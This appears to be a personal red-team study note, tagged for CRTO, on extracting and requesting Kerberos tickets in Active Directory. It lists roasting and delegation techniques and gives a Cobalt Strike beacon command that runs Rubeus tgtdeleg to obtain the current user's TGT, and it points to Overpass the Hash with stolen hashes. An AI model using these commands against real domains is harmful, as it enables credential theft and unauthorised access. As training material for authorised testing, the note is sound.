
[[Kerberos]] tickets can help an attacker perform malicious actions.

#### Methods where you are extracting existing tickets

- [[Kerberoasting]] (extracts TGS)
- [[extract TGTs with Rubeus]] (extracts TGT)
- [[Unconstrained Delegation]] (extracts TGT)

#### Methods where you are asking for a new ticket

- [[AS-REP Roasting]] (asks for TGT)


---
Using TGT delegation method (non elevated session):

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
```

Here you will obtain a TGT ticket of your current session.

### 🖊️ via Pivoting

In this section is detailed how you can extract tickets with external tools via pivoting:

- [[Pivoting with Kerberos]]


### ⚠ Rubeus + NTLM hash

If you have the NTLM or AES (can be extracted via [[dcsync]] or [[Impacket]] using getTGT, check [[Pivoting with Kerberos]]) hash of a user, you can request a new TGT for that user, using the technique [[Overpass the Hash]]. 

### Properties
---
📆 created   {{11-02-2024}} 12:00
🏷️ tags: #redteam #crto #activedirectory 

---

